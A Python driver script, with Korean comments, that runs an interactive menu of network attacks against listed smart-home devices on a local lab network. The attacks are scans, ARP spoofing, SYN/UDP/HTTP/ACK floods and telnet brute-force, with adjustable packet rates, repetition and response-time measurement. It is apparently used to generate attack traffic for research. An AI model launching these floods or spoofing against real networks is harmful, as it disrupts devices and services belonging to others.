from attacks import *
import random
from time import sleep
import os
import threading


# todo: port scan 시 특정 포트들만 스캔하고 싶다면 아래 open_ports 리스트 활성화 & 포트 기재
open_ports = {}  ##### need to add ports
# open_ports = {'192.168.10.3': [554, 8000, 8200, 9010],                  # EZVIZ
#               '192.168.10.4': [80, 443, 8080],                          # Hue
#               '192.168.10.5': [7778, 8008, 8009, 8443, 9000, 10001],    # Google Home
#               '192.168.10.6': [443, 554, 2020, 8800]}                   # Tapo

attack_type_text = '\n<Attack Types>\n' \
                   '1. Host Discovery\n' \
                   '2. Port Scanning\n' \
                   '3. Service Detection\n' \
                   '4. ARP Spoofing\n' \
                   '5. SYN Flooding\n' \
                   '6. Telnet Brute-force\n' \
                   '7. UDP Flooding\n' \
                   '8. HTTP Flooding\n' \
                   '9. ACK Flooding\n' \
                   '0. QUIT\n' \
                   'Select one of attack types: '

attack_target_text = '\n<Attack Target>\n' \
                   '1. Smartphone 1\n' \
                   '2. Smartphone 2\n' \
                   '3. Smart Clock 1\n' \
                   '4. Google Nest Mini 1\n' \
                   '5. Google Nest Mini 2\n' \
                   '6. Smart TV\n' \
                   '7. Lenovo Bulb 1\n' \
                   '8. Lenovo Bulb 2\n' \
                   '9. Cam 1\n' \
                   '10. Cam 2\n' \
                   '11. Smart Plug 1\n' \
                   '12. Smart Plug 2\n' \
                   '13. Raspberry Pi (Telnet Brute-force)\n' \
                   'Select one of the attack targets: '
TARGET_DICT={1:"Smartphone 1",
           2:"Smartphone 2",
           3:"Smart Clock 1",
           4:"Google Nest Mini 1",
           5:"Google Nest Mini 2",
           6:"Smart TV",
           7:"Lenovo Bulb 1",
           8:"Lenovo Bulb 2",
           9:"Cam 1",
           10:"Cam 2",
           11:"Smart Plug 1",
           12:"Smart Plug 2",
           13:"Raspberry Pi"}

IP_DICT = {1:"192.168.0.101",
           2:"192.168.0.102",
           3:"192.168.0.111",
           4:"192.168.0.121",
           5:"192.168.0.122",
           6:"192.168.0.131",
           7:"192.168.0.141",
           8:"192.168.0.142",
           9:"192.168.0.151",
           10:"192.168.0.152",
           11:"192.168.0.161",
           12:"192.168.0.162",
           13:"192.168.0.191",}

ATK_DICT={1:host_discovery,
          2:port_scanning,
          3:os_and_service_detection,
          4:arp_spoofing,
          5:syn_flood,
          6:scan_brute_force,
          7:udp_flood,
          8:http_flood,
          9:ack_flood,
          10:tcp_replay}

def launch_attack(selection, target_ip, **atk_kwargs):
    if isinstance(target_ip, int):
        device=TARGET_DICT[target_ip]
        target_ip=IP_DICT[target_ip]
    else:
        device=target_ip

    attack=ATK_DICT[selection]
    
    if selection ==1:
        args=('192.168.0.0/24', atk_kwargs['intensity'])
    elif selection in [2,3]:
        args=(target_ip, atk_kwargs['intensity'])

    elif selection ==4:
        runtime = random.randrange(10, 61)
        args=(target_ip, '192.168.0.1', runtime)
    elif selection in [5,7,8,9]:
        count = atk_kwargs['pps'] * atk_kwargs['time'] 
        port=80
        if selection == 5:
            if target_ip in open_ports.keys():
                port = random.choice(open_ports[target_ip])  # 기기별 열린 포트 중 하나 선택
            else:
                port = random.randrange(1, 65536)   # 열린 포트 정보가 없다면 랜덤 지정
        elif selection ==7:
            port = 2
        
        args=(target_ip, port, atk_kwargs['pps'], count)
    elif selection == 10:
        args=(atk_kwargs["pcap"], atk_kwargs["loop"])
        
    t1 = ThreadWithReturnValue(target=measure_response, args=(atk_kwargs['time'], target_ip))
    t2 = threading.Thread(target=attack, args=args)
    t1.start()
    # starting thread 2
    t2.start()

    # wait until thread 1 is completely executed
    rtt, percent_time=t1.join()
    # wait until thread 2 is completely executed
    t2.join()
    return device, attack.__name__, rtt, percent_time

def check_ip_format(ip):
    correct_ip = True
    ip_split = ip.split('.')
    if ip.count('.') != 3:
        print('(Wrong format) IP address should be written in the form of 0.0.0.0')
        correct_ip = False
    elif len(ip) > 15 or len(ip) < 7:
        print('(Wrong format) Check the IP address.')
        correct_ip = False
    else:
        for num in ip_split:
            try:
                num = int(num)
                if num not in range(0, 256):
                    print('(Wrong format) Number should be in the range of 0~255')
                    correct_ip = False
                    break
            except ValueError:
                print('(Wrong format) Check the IP address.')
                correct_ip = False
                break
    return correct_ip


def run_type_A(target_ip: str):
    selection = input(attack_type_text)  # 이때 입력은 문자열 형식
    while selection not in range(0, 10):
        try:
            selection = int(selection)  # 문자열을 정수로 변환
        except ValueError:  # 입력값이 정수로 나타낼 수 없는 경우 에러 발생
            selection = input('> Wrong input. Please try again: ')

    if selection == 0:  # 0. QUIT
        print('Good bye.')
        return False

    ntimes = int(input('How many times to repeat the selected attack: '))
    if ntimes > 1:
        sleep_time = input('What is the sleep time in sec between attacks?')
        sleep_time = int(sleep_time)
    while True:
        try:
            ntimes = int(ntimes)
            break
        except ValueError:
            ntimes = input('> Wrong input. Please try again: ')

    intensity_list = list()
    if selection in [1, 2, 3]:  # scan 공격이면 intensity가 골고루 되도록 세팅
        i: int = 3
        for n in range(ntimes):
            intensity_list.append(i)
            i += 1
            if i == 5: i = 2
        random.shuffle(intensity_list)

    for n in range(1, ntimes + 1):
        print(f'\n============ Attack try #{n} ============')
        if selection in [1, 2, 3]:
            launch_attack(selection, target_ip=target_ip, intensity=intensity_list.pop(0))
        elif selection in [5, 7, 8, 9]:
            pps = input('How many packet per second(pps) is send for flooding attacks? (e.g. 14000)')
            time = input('How long does each attack last (in sec)?')
            pps, time = int(pps), int(time)
            launch_attack(selection, target_ip=target_ip, pps=pps, time=time)
        else:
            launch_attack(selection, target_ip=target_ip)
        if n < ntimes:
            # sleep_time = random.randrange(10, 60)   ##### need to change
            print(f'Sleeping for {sleep_time}s...')
            sleep(sleep_time)  # 공격 사이에 랜덤하게 쉬기

    return True  # 공격 수행 후 True를 return


if __name__ == '__main__':
    if os.getuid() != 0:
        exit('Please run this script as root user. Type "su root" to switch to root.')

    target_selection = input(attack_target_text)
    while target_selection not in range(1, 14):
        try:
            target_selection = int(target_selection)  # 문자열을 정수로 변환
        except ValueError:  # 입력값이 정수로 나타낼 수 없는 경우 에러 발생
            target_selection = input('> Wrong input. Please try again: ')
    target = IP_DICT[target_selection]
    while not check_ip_format(target):
        target = input('> Please try again: ')
    while run_type_A(target):     # 0. QUIT 을 입력할 때까지 반복
        pass
